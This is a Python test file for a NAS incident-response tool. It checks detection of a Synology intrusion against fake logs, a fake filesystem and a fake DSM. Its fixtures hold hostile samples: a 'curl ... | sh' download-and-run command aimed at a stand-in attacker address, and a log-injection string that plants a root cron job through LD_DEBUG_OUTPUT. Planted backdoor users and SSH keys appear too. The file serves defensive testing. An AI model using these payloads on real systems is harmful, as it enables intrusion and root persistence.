"""Offline checks of the C3RB3R indicators of compromise: the injection payload in the connection log
(exploit_attempts), the root-side collector run for real against a fake filesystem tree (Python 3.8 code),
the verdicts on canned collector JSON, and the root-task round trip through a fake DSM."""
import base64
import ipaddress
import json
import lzma
import os
import re
import subprocess
import sys
import types

import _env

from nas import commands, config, incident, ioc
from nas.errors import NasError
from fakenas import FakeNas, FakeSession, args, ok

# Documentation addresses (RFC 5737) stand in for attacker addresses: 198.51.100.0/24 and 203.0.113.0/24 count
# as public here (ipaddress calls every RFC 5737 range non-global); 192.0.2.0/24 stays the LAN.
_DOC_PUBLIC = [ipaddress.ip_network("198.51.100.0/24"), ipaddress.ip_network("203.0.113.0/24")]
_real_is_global = ioc._is_global
ioc._is_global = lambda ip: _real_is_global(ip) or any(_in(ip, n) for n in _DOC_PUBLIC)


def _in(ip, net):
    try:
        return ipaddress.ip_address(ip) in net
    except ValueError:
        return False


IOC = {"ioc_ips": ["198.51.100.66", "203.0.113.125"]}
assert config.DEFAULTS["incident"]["ioc_ips"] == ["46.8.78.122", "104.253.175.125"]
_env.use_config({"incident": IOC})
CMD = "curl -s http://198.51.100.66/xdy5.sh|sh"
B64 = base64.b64encode(CMD.encode()).decode()
# account field in the shape of the injection seen in the wild, with real newlines/tabs, plus a terminal escape
# to prove log content is printed as data
ACCOUNT = ("admin\nPLUGIN_VALUE_END\nLD_PRELOAD=PLUGIN_VALUE_START\nNOP\n*\t*\t*\t*\t*\troot\techo\t" + B64 +
           "\t|base64\t-d|sh\nNOP\nPLUGIN_VALUE_END\nLD_DEBUG=libs\nLD_DEBUG_OUTPUT=/etc/cron.d/synotest\n"
           "ESCAPE=PLUGIN_VALUE_START\nNOP\x1b[31m")

# --- scan_text / connection log ------------------------------------------------------------------------------
sc = ioc.scan_text(ACCOUNT)
assert sc["commands"] == [CMD] and sc["cron_targets"] == ["/etc/cron.d/synotest"] and "198.51.100.66" in sc["ips"], sc
assert "PLUGIN_VALUE_END" in sc["markers"] and "LD_DEBUG_OUTPUT" in sc["markers"]
# the same with literal "\n" / "\t" (how some logs print it)
lit = ACCOUNT.replace("\n", "\\n").replace("\t", "\\t")
assert ioc.scan_text(lit)["commands"] == [CMD] and ioc.scan_text(lit)["cron_targets"] == ["/etc/cron.d/synotest"]
assert ioc.clean("a\x1b[31mb\nc", 50) == "a\\x1b[31mb\\nc" and ioc.clean("x" * 300, 10) == "x" * 10 + "..."

nas = FakeNas()
nas.st["own_signin"] = [
    {"time": "2026/10/30 11:59:00", "descr": "User [ops] from [192.0.2.50] signed in to [DSM] successfully via [password]"},
    {"time": "2001/02/03 04:05:06", "descr": f"User [{ACCOUNT}] from [198.51.100.66] failed to sign in to [DSM] via [password] due to authorization failure."},
    {"time": "2001/02/03 01:02:03", "descr": "User [admin] from [203.0.113.125] failed to sign in to [DSM] via [password] due to authorization failure."},
]
lines, data, rc = incident.audit(FakeSession(nas), args())
it = next(i for i in data["items"] if i["id"] == "exploit_attempts")
assert it["status"] == "WARN" and "2 sign-in attempt(s)" in it["detail"], it
for want in ("198.51.100.66", "203.0.113.125", "/etc/cron.d/synotest", CMD, "first 2001/02/03 01:02:03",
             "last 2001/02/03 04:05:06"):
    assert want in it["detail"], (want, it["detail"])
assert "attempt seen" in it["hint"] and "--deep" in it["hint"]
text = "\n".join(lines)
assert "\x1b" not in text, "control characters from logs never reach the terminal"
lg = "\n".join(commands.logs(FakeSession(nas), types.SimpleNamespace(since=None, limit=100, top=5))[0])
assert "\x1b" not in lg and "admin\\nPLUGIN_VALUE_END" in lg, lg
assert all(i["status"] == "SKIP" and "--deep" in i["detail"] for i in data["items"] if i["id"] in ioc.DEEP_IDS)

# --- the collector itself, against a fake root (runs the exact code the NAS runs) ------------------------
R = os.path.join(_env.TMP, "root")


def put(path, content, mode=0o644, xz=False):
    p = R + path
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if xz:
        with lzma.open(p, "wt") as f:
            f.write(content)
    else:
        with open(p, "w") as f:
            f.write(content)
    os.chmod(p, mode)


plugin = ("2001-02-03T04:05:00+00:00 nas synoplugin: noise from 198.51.100.4 203.0.113.200\n"
          "2001-02-03T04:05:06+00:00 nas synoplugin: POST weblogin Args: USER=" + ACCOUNT + "\n"
          "2001-02-03T04:05:07+00:00 nas synoplugin: normal line\n")
put("/var/log/synoplugin.log.10.xz", plugin, xz=True)
put("/var/log/synoscgi.log.1.xz", "2001-02-03T04:05:06+00:00 nas synoscgi: User [admin\nPLUGIN_VALUE_END ...] failed to sign in\n", xz=True)
put("/var/log/auth.log.1.xz", "2001-02-04T01:00:00+00:00 nas login[1]: pam_unix(webui:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=203.0.113.77\n"
                             "2001-02-02T01:00:00+00:00 nas login[1]: pam_unix(webui:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=203.0.113.77\n", xz=True)
put("/var/log/auth.log", "2001-02-03T04:05:06+00:00 nas login[1]: pam_unix(webui:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=198.51.100.66\n"
                         "2001-02-03T05:00:00+00:00 nas sshd[2]: authentication failure; rhost=203.0.113.9 user=root\n")
put("/etc/crontab", "MAILTO=\"\"\n0 0 * * * root /usr/syno/bin/synoschedtask --run id=1\n")
put("/etc/cron.d/synotest", "*\t*\t*\t*\t*\troot\techo\t" + B64 + "\t|base64\t-d|sh\n")
put("/bin/libgld", "\x7fELF")
put("/tmp/x/xdy5.sh", "#!/bin/sh\n")
put("/etc/passwd", "root:x:0:0::/root:/bin/ash\ntoor:x:0:0::/root:/bin/sh\nadmin:x:1024:100::/var/services/homes/admin:/sbin/nologin\n"
                   "ops:x:1026:100::/var/services/homes/ops:/bin/sh\nevil:x:1030:100::/tmp:/bin/sh\n"
                   "SynologyDrive:x:1031:1031::/var/packages/SynologyDrive/home:/sbin/nologin\n")
os.makedirs(R + "/var/packages/SynologyDrive", exist_ok=True)
put("/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabcdef0123456789 attacker@198.51.100.66\n")
for pid, exe, cmd, cg in [(101, "/usr/syno/sbin/synoscgi", "synoscgi", ""), (202, "/bin/qnetd", "qnetd -d", ""),
                          (303, "/opt/odd/agent", "agent", ""), (404, "/usr/local/bin/mediad", "mediad", "0::/docker/abc")]:
    d = R + f"/proc/{pid}"
    os.makedirs(d + "/fd", exist_ok=True)
    os.symlink(exe, d + "/exe")
    open(d + "/cmdline", "wb").write(cmd.replace(" ", "\0").encode())
    open(d + "/cgroup", "w").write(cg)
os.symlink("socket:[777]", R + "/proc/202/fd/3")
# 192.0.2.10:5001 <- local, remote 198.51.100.66:80 (little-endian hex), state 01 = ESTABLISHED
put("/proc/net/tcp", "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
                     "   0: 0A0200C0:1389 426433C6:0050 01 00000000:00000000 00:00000000 00000000     0        0 777\n")
_env.use_config({"incident": dict(IOC, allowed_users=["ops"])})
d = ioc.collect(types.SimpleNamespace(backend_name="password"), root=R)
assert d["version"] == 1 and not d["errors"], d["errors"]
assert [e["file"] for e in d["log_events"]] == ["/var/log/synoplugin.log.10.xz", "/var/log/synoscgi.log.1.xz",
                                                 "/var/log/auth.log"], [e["file"] for e in d["log_events"]]
assert d["auth_no_user"] == {"198.51.100.66": {"count": 1, "first": "2001-02-03T04:05:06+00:00",
                                              "last": "2001-02-03T04:05:06+00:00"},
                             "203.0.113.77": {"count": 2, "first": "2001-02-02T01:00:00+00:00",
                                              "last": "2001-02-04T01:00:00+00:00"}}, d["auth_no_user"]
assert {f["path"] for f in d["files"]} == {"/bin/libgld", "/etc/cron.d/synotest", "/tmp/x/xdy5.sh"}, d["files"]
assert d["connections"][0]["remote_ip"] == "198.51.100.66" and d["connections"][0]["exe"] == "/bin/qnetd"
items = {i["id"]: i for i in ioc.evaluate_deep(d, incident.item)}
assert {k: v["status"] for k, v in items.items()} == {
    "exploit_attempts_logs": "WARN", "ioc_cron": "FAIL", "ioc_binaries": "FAIL", "ioc_users": "FAIL",
    "ioc_ssh_keys": "FAIL", "ioc_processes": "FAIL"}, {k: v["status"] for k, v in items.items()}
assert CMD in items["exploit_attempts_logs"]["detail"] and "/etc/cron.d/synotest" in items["exploit_attempts_logs"]["detail"]
assert "203.0.113.200" not in items["exploit_attempts_logs"]["detail"], "context-line addresses are not attack sources"
det = items["exploit_attempts_logs"]["detail"]
assert "IOC addresses: 198.51.100.66 x1" in det and "2 other auth.log failures without user= from 1 address" in det, det
assert "203.0.113.77" not in det.split("context:")[0], "guessing noise is not listed as an attack source"
assert "toor" in items["ioc_users"]["detail"]
assert "qnetd" in items["ioc_processes"]["detail"] and "IOC address 198.51.100.66" in items["ioc_processes"]["detail"]
assert "\x1b" not in json.dumps([i["detail"] for i in items.values()])

# a clean box: only DSM's own cron, known users, Synology processes, a container
for p in ("/etc/cron.d/synotest", "/bin/libgld", "/tmp/x/xdy5.sh", "/root/.ssh/authorized_keys",
          "/var/log/synoplugin.log.10.xz", "/var/log/synoscgi.log.1.xz", "/var/log/auth.log", "/var/log/auth.log.1.xz"):
    os.remove(R + p)
put("/etc/passwd", "root:x:0:0::/root:/bin/ash\nadmin:x:1024:100::/var/services/homes/admin:/sbin/nologin\n"
                   "ops:x:1026:100::/var/services/homes/ops:/bin/sh\n")
put("/proc/net/tcp", "  sl  local_address rem_address   st\n")
os.remove(R + "/proc/202/exe")
os.remove(R + "/proc/303/exe")
d = ioc.collect(types.SimpleNamespace(backend_name="password"), root=R)
items = {i["id"]: i for i in ioc.evaluate_deep(d, incident.item)}
assert all(v["status"] == "PASS" for v in items.values()), {k: (v["status"], v["detail"]) for k, v in items.items()}
assert "1 in containers" in items["ioc_processes"]["detail"]
# an unknown user and a process outside Synology paths are WARN, not FAIL
_env.use_config({})
d["users"].append({"name": "newuser", "uid": 1040, "home": "/var/services/homes/newuser", "shell": "/bin/sh"})
d["processes"].append({"pid": 9, "exe": "/opt/thing/bin/x", "cmdline": "x", "container": False})
items = {i["id"]: i for i in ioc.evaluate_deep(d, incident.item)}
assert items["ioc_users"]["status"] == "WARN" and "ops" in items["ioc_users"]["detail"], items["ioc_users"]
assert items["ioc_processes"]["status"] == "WARN"

# --- root task round trip through a fake DSM ------------------------------------------------------------
canned = {"version": 1, "time": "2026-10-30 14:00:00", "errors": [], "log_events": [], "auth_no_user": {},
          "files": [], "cron": {"crontab": None, "cron_d": [], "spool": []}, "users": [], "packages": [],
          "ssh_keys": [], "processes": [], "connections": []}


class DeepSession(FakeSession):
    def __init__(self, nas, marker_ok=True):
        super().__init__(nas)
        self.files, self.marker_ok = {}, marker_ok
        self.backend.confirm_password = lambda: "t"

    def call(self, api, method, params=None, version=None, timeout=None):
        p = params or {}
        if (api, method) == ("SYNO.FileStation.List", "list_share"):
            self.nas.sent.append((api, method))
            return ok({"shares": [{"name": "files", "additional": {"real_path": "/volume1/files"}}]})
        if (api, method) == ("SYNO.Core.TaskScheduler", "run"):
            script = self.nas.st["tasks"][p["tasks"][0]["id"]]["script"]
            m = re.search(r'"\$S/(nas-incident-deep-[0-9a-f]+\.json)" (\S+)', script)
            assert m and "/volume1/files/.nas-cli-deploy" in script and '[ -L "$S" ]' in script, script[:300]
            assert len(script) < 9000, len(script)
            self.files[m.group(1)] = json.dumps(dict(canned, marker=m.group(2) if self.marker_ok else "other"))
        if (api, method) == ("SYNO.FileStation.Delete", "start"):
            self.files.pop(json.loads(p["path"])[0].rsplit("/", 1)[1], None)
        return super().call(api, method, params, version, timeout)

    def http_raw(self, path, **kw):
        name = re.search(r"nas-incident-deep-[0-9a-f]+\.json", __import__("urllib.parse").parse.unquote(path))
        body = self.files.get(name.group(0)) if name else None
        return (200, {}, body, {}) if body else (404, {}, '{"error":{"code":408}}', {})


_env.use_config({"deploy": {"stage_dir": "/files/.nas-cli-deploy"}})
from nas import selfmon
selfmon.time.sleep = lambda s: None
nas = FakeNas()
ds = DeepSession(nas)
d = ioc.collect(ds)
assert d["version"] == 1 and nas.st["tasks"] == {} and ds.files == {}, (nas.st["tasks"], ds.files)
assert ("SYNO.FileStation.Delete", "start") in nas.sent
try:
    ioc.collect(DeepSession(FakeNas(), marker_ok=False), timeout=4)
    raise AssertionError("a result with the wrong marker was accepted")
except NasError as e:
    assert "wrong marker" in str(e)
_env.use_config({"deploy": {"stage_dir": "/files/.nas-cli-deploy"}, "snapshot_shares": ["photos", "docs"]})
lines, data, rc = incident.audit(DeepSession(FakeNas()), args(deep=True))
st = {i["id"]: i["status"] for i in data["items"]}
assert all(st[i] == "PASS" for i in ioc.DEEP_IDS), st
assert data["deep"]["version"] == 1
print(f"ioc checks ok (python {sys.version.split()[0]})")
